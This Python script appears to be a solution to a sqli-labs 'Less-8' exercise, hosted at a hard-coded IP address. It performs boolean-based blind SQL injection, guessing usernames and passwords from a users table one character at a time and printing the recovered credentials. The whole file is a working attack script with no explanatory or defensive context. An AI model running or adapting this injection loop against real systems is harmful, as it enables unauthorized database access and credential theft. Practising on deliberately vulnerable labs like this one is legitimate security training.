# -*- coding:utf8 -*-
import requests
list1 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
         'w', 'x', 'y', 'z', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '-', '|', '_', 'A', 'B', 'C', 
         'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 
         'Z', '.']  # 字典
url = 'http://47.104.232.176:9002/Less-8/?id=1%27'
payload = '%20and%20left((select%20username%20from%20users%20where%20id%20={n}),{w})=%27{d}%27%20--%20k'
str1 = 'You are in...........'
username = ['', '', '', '', '', '', '', '', '', '', '', '', '', '']
password = ['', '', '', '', '', '', '', '', '', '', '', '', '', '']
for i in range(1, 15):
    for j in range(1, 11):
        for l in list1:
            p = payload.format(n=i, w=j, d=username[i-1]+l)
            u = requests.get(url+p)
            if 'You' in u.text:
                username[i-1] += l
                print (u'正在对比第', i, u'个记录的username的第', j, u'个字符', username[i-1])
payload2 = '%20and%20left((select%20password%20from%20users%20where%20id%20={n}),{w})=%27{d}%27%20--%20k'
for i in range(1, 15):
    for j in range(1, 11):
        for l in list1:
            p = payload2.format(n=i, w=j, d=password[i-1]+l)
            u = requests.get(url+p)
            if 'You' in u.text:
                password[i-1] += l
                print (u'正在对比第', i, u'个记录的password的第', j, u'个字符', password[i-1])
print ('id    username    password')
for i in range(1, 15):
    print (i, '-', username[i-1], '-', password[i-1])
a = raw_input()

